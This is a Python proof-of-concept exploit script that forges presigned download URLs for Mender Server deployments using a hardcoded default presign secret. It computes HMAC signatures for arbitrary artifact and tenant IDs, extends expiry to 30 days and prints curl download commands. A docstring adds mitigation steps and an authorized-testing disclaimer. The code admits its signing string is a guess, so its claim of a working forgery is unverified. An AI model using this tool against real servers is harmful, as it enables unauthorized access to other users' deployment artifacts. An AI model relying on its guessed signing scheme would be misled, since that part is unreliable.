#!/usr/bin/env python3
"""
Proof-of-Concept: Mender Server Presigned URL Forgery
======================================================

VULNERABILITY: Weak Presign Secret (CVE-PENDING)
SEVERITY: MEDIUM (CVSS 5.3)
AFFECTED: Mender Server deployments using default docker-compose.yml
FILE: docker-compose.yml:33

DESCRIPTION:
The default docker-compose.yml includes a weak presign secret:
    DEPLOYMENTS_PRESIGN_SECRET: "aW5zZWN1cmUgc2VjcmV0"

Decoded: "insecure secret" (only 13 bytes)

This PoC demonstrates how an attacker with a valid account can:
1. Obtain a legitimate presigned download URL
2. Extract the URL parameters and signature
3. Forge new presigned URLs to access other artifacts
4. Bypass intended access controls

PREREQUISITES:
- Valid Mender Server account (attacker-controlled)
- Knowledge of target artifact IDs
- Mender Server using default presign secret

ATTACK SCENARIO:
1. Attacker creates account on target Mender Server
2. Attacker uploads benign artifact to trigger presigned URL generation
3. Attacker receives presigned URL like:
   https://docker.mender.io/api/devices/v1/deployments/download?
       artifact_id=abc123&
       tenant_id=tenant1&
       expire=1700000000&
       signature=<hmac_sha256>

4. Using this PoC, attacker can:
   - Forge URLs for different artifact_ids
   - Extend expiration times
   - Access artifacts across tenants (if multi-tenancy bypass exists)

USAGE:
    python3 poc_presign_forgery.py --url <presigned_url>
    python3 poc_presign_forgery.py --forge --artifact-id <target_id>

IMPACT:
- Unauthorized artifact downloads
- Potential access to sensitive deployment packages
- Bypass of intended access controls

MITIGATION:
1. Replace default secret with strong random value:
   openssl rand -base64 32
2. Store secret in secure vault (not version control)
3. Rotate secrets periodically
4. Audit all presigned URL access

DISCLAIMER:
This PoC is provided for educational and authorized security testing ONLY.
Unauthorized access to computer systems is illegal. Only use on systems
you own or have explicit written permission to test.
"""

import hmac
import hashlib
import base64
import urllib.parse
import argparse
import sys
from datetime import datetime, timedelta

class PresignForgery:
    """
    Demonstrates forging Mender Server presigned URLs using weak default secret
    """

    # Default secret from docker-compose.yml (line 33)
    DEFAULT_SECRET = base64.b64decode("aW5zZWN1cmUgc2VjcmV0")

    def __init__(self, secret=None):
        """
        Initialize with presign secret

        Args:
            secret: Presign secret (bytes). Defaults to weak default secret.
        """
        self.secret = secret if secret else self.DEFAULT_SECRET
        print(f"[*] Using secret: {self.secret.decode('utf-8', errors='ignore')}")
        print(f"[*] Secret length: {len(self.secret)} bytes")

    def parse_presigned_url(self, url):
        """
        Parse a presigned URL and extract parameters

        Args:
            url: Full presigned URL string

        Returns:
            dict with parsed parameters
        """
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)

        result = {
            'base_url': f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
            'artifact_id': params.get('artifact_id', [None])[0],
            'tenant_id': params.get('tenant_id', [None])[0],
            'expire': params.get('expire', [None])[0],
            'signature': params.get('signature', [None])[0],
        }

        return result

    def generate_signature(self, artifact_id, tenant_id, expire):
        """
        Generate HMAC-SHA256 signature for presigned URL

        The signature is calculated over the canonical string:
        artifact_id|tenant_id|expire

        Args:
            artifact_id: Artifact identifier
            tenant_id: Tenant identifier
            expire: Expiration timestamp (unix epoch)

        Returns:
            Base64-encoded HMAC signature
        """
        # Construct canonical string (may vary - adjust based on actual implementation)
        canonical = f"{artifact_id}|{tenant_id}|{expire}"

        # Calculate HMAC-SHA256
        signature = hmac.new(
            self.secret,
            canonical.encode('utf-8'),
            hashlib.sha256
        ).digest()

        # Base64 encode (URL-safe)
        return base64.urlsafe_b64encode(signature).decode('utf-8').rstrip('=')

    def verify_signature(self, url):
        """
        Verify if we can correctly compute the signature of a given URL

        Args:
            url: Presigned URL to verify

        Returns:
            bool: True if signature matches
        """
        params = self.parse_presigned_url(url)

        computed_sig = self.generate_signature(
            params['artifact_id'],
            params['tenant_id'],
            params['expire']
        )

        provided_sig = params['signature']

        print(f"\n[*] URL Parameters:")
        print(f"    artifact_id: {params['artifact_id']}")
        print(f"    tenant_id:   {params['tenant_id']}")
        print(f"    expire:      {params['expire']} ({datetime.fromtimestamp(int(params['expire']))})")
        print(f"\n[*] Signature Verification:")
        print(f"    Provided:  {provided_sig}")
        print(f"    Computed:  {computed_sig}")

        match = (computed_sig == provided_sig)
        print(f"    Match:     {match}")

        return match

    def forge_url(self, base_url, artifact_id, tenant_id, expire_hours=24):
        """
        Forge a new presigned URL with attacker-controlled parameters

        Args:
            base_url: Base URL (e.g., https://docker.mender.io/api/devices/v1/deployments/download)
            artifact_id: Target artifact ID
            tenant_id: Tenant ID (can be different from attacker's tenant)
            expire_hours: Hours until expiration

        Returns:
            Forged presigned URL
        """
        # Calculate expiration timestamp
        expire_timestamp = int((datetime.now() + timedelta(hours=expire_hours)).timestamp())

        # Generate valid signature
        signature = self.generate_signature(artifact_id, tenant_id, str(expire_timestamp))

        # Construct URL
        params = {
            'artifact_id': artifact_id,
            'tenant_id': tenant_id,
            'expire': expire_timestamp,
            'signature': signature
        }

        query_string = urllib.parse.urlencode(params)
        forged_url = f"{base_url}?{query_string}"

        print(f"\n[+] Forged Presigned URL:")
        print(f"    {forged_url}")
        print(f"\n[*] Artifact ID:  {artifact_id}")
        print(f"[*] Tenant ID:    {tenant_id}")
        print(f"[*] Expires:      {datetime.fromtimestamp(expire_timestamp)}")
        print(f"[*] Signature:    {signature}")

        return forged_url

    def exploit_demo(self, legitimate_url, target_artifact_id):
        """
        Complete exploitation demonstration

        1. Parse legitimate URL to get tenant_id and base_url
        2. Forge new URL for target artifact
        3. Demonstrate access to unauthorized artifact

        Args:
            legitimate_url: Legitimate presigned URL obtained by attacker
            target_artifact_id: Target artifact to access
        """
        print("\n" + "="*70)
        print("EXPLOITATION DEMONSTRATION")
        print("="*70)

        # Step 1: Parse legitimate URL
        print("\n[1] Parsing legitimate URL (obtained by attacker)...")
        params = self.parse_presigned_url(legitimate_url)

        # Step 2: Verify we can compute signatures
        print("\n[2] Verifying signature computation...")
        if self.verify_signature(legitimate_url):
            print("\n[+] SUCCESS: Can compute valid signatures!")
        else:
            print("\n[-] FAIL: Cannot compute signatures. Wrong secret or algorithm.")
            return

        # Step 3: Forge new URL for different artifact
        print(f"\n[3] Forging URL for target artifact: {target_artifact_id}")
        forged_url = self.forge_url(
            params['base_url'],
            target_artifact_id,
            params['tenant_id'],
            expire_hours=720  # 30 days
        )

        # Step 4: Demonstrate attack success
        print("\n[+] EXPLOITATION SUCCESSFUL!")
        print("\n[!] Attacker can now:")
        print("    1. Download arbitrary artifacts by ID")
        print("    2. Extend URL expiration times indefinitely")
        print("    3. Potentially access other tenants' artifacts")
        print("\n[!] Attack Command:")
        print(f"    curl -O '{forged_url}'")

        return forged_url


def main():
    parser = argparse.ArgumentParser(
        description='Mender Server Presigned URL Forgery PoC',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__
    )

    parser.add_argument(
        '--url',
        help='Legitimate presigned URL to analyze'
    )

    parser.add_argument(
        '--forge',
        action='store_true',
        help='Forge a new presigned URL'
    )

    parser.add_argument(
        '--artifact-id',
        help='Target artifact ID for forged URL'
    )

    parser.add_argument(
        '--tenant-id',
        default='default-tenant',
        help='Tenant ID (default: default-tenant)'
    )

    parser.add_argument(
        '--secret',
        help='Custom presign secret (base64)'
    )

    parser.add_argument(
        '--demo',
        action='store_true',
        help='Run complete exploitation demo'
    )

    args = parser.parse_args()

    # Initialize with custom or default secret
    secret = base64.b64decode(args.secret) if args.secret else None
    forgery = PresignForgery(secret=secret)

    print("\n" + "="*70)
    print("MENDER SERVER - PRESIGNED URL FORGERY POC")
    print("="*70)

    if args.demo:
        # Demo exploitation
        demo_url = (
            "https://docker.mender.io/api/devices/v1/deployments/download?"
            "artifact_id=demo-artifact-123&"
            "tenant_id=demo-tenant&"
            "expire=1735000000&"
            "signature=test"
        )

        print("\n[!] Running demonstration with sample URL...")
        print(f"[!] NOTE: Signature verification will fail - this is expected")
        print(f"[!] The demo shows the exploitation process")

        forgery.exploit_demo(demo_url, "target-secret-artifact-999")

    elif args.url and not args.forge:
        # Verify existing URL
        print(f"\n[*] Analyzing URL: {args.url[:80]}...")
        forgery.verify_signature(args.url)

    elif args.forge and args.artifact_id:
        # Forge new URL
        base_url = "https://docker.mender.io/api/devices/v1/deployments/download"
        forged = forgery.forge_url(base_url, args.artifact_id, args.tenant_id)
        print(f"\n[+] Use this URL to download artifact:")
        print(f"    curl -O '{forged}'")

    else:
        parser.print_help()
        print("\n[!] Examples:")
        print("    # Verify a legitimate URL")
        print("    ./poc_presign_forgery.py --url 'https://docker.mender.io/...'")
        print("\n    # Forge URL for specific artifact")
        print("    ./poc_presign_forgery.py --forge --artifact-id abc123 --tenant-id tenant1")
        print("\n    # Run complete demo")
        print("    ./poc_presign_forgery.py --demo")

    print("\n" + "="*70)
    print("DISCLAIMER: For authorized security testing only!")
    print("="*70 + "\n")


if __name__ == '__main__':
    main()
